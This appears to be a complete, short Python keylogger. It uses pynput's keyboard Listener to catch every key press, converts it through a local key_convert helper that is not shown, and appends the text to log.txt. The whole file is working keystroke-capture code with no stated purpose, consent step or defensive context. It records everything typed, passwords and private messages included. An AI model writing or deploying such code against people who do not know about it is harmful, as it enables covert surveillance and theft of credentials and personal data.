from pynput.keyboard import Listener
from key_convert import key_convert

# Function to write to log file
def write_to_log(key):
    # Check for the keys
    data = key_convert(key)
    if data is None:
        return
    #Append the text to log file
    with open("log.txt", 'a') as log:
        log.write(data)

# Listen for the keystrokes
with Listener(on_press=write_to_log) as l:
    l.join()